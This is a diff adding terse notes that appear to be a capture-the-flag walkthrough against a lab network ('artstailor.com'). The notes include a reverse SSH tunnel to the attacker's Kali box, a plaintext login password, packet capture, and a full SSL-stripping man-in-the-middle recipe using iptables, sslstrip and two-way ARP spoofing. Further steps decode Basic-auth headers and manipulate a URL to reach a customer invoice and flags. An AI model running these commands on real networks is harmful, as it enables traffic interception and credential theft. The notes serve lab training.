@@ -1,0 +1,26 @@
+kali > sudo service ssh start
+remote desktop to innerouter and open up ssh -R 1081 kali@172.24.0.10 
+proxychains ssh l.strauss@devbox.artstailor.com
+password: CongregationEmanu-El
+proxychains scp -r sslstrip-extras l.strauss@devbox.arstailor.com
+gunzip and tar -xvf
+sudo ./tcpdump -i ens32 -w ~/capture.pcap -Z l.strauss
+proxychains scp l.strauss@devbox:capture.pcap ./
+wireshark capture.pcap
+IMPORTANT STEPS:
+    from readme:
+        1) echo "1" > /proc/sys/net/ipv4/ip_forward
+        2) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 6166
+        3) python3 sslstrip.py -w strip.logs -l 6166 -a
+        4) TWO DIFFERENT TERMINALS:
+            route -n to find gateway (1)
+            wireshark to find host ip to spoof (101)
+            ./arpsoof -i ens32 -t 10.70.184.101 10.70.184.1
+            ./arpsoof -i ens32 -t 10.70.184.1 10.70.184.101
+        5) tail -n strip.log
+        6) fuser -k 80/tcp if needed
+
+You know have a list of sites
+Can examine and decode the Authentication : Basic part to get key015
+Can examine the HTML path and try and remove part of the url to get to "artstailor.com/Corp/secret"
+Here, we can get to an invoice for C. Steadman and we get his address, a KEY016 and what he bought
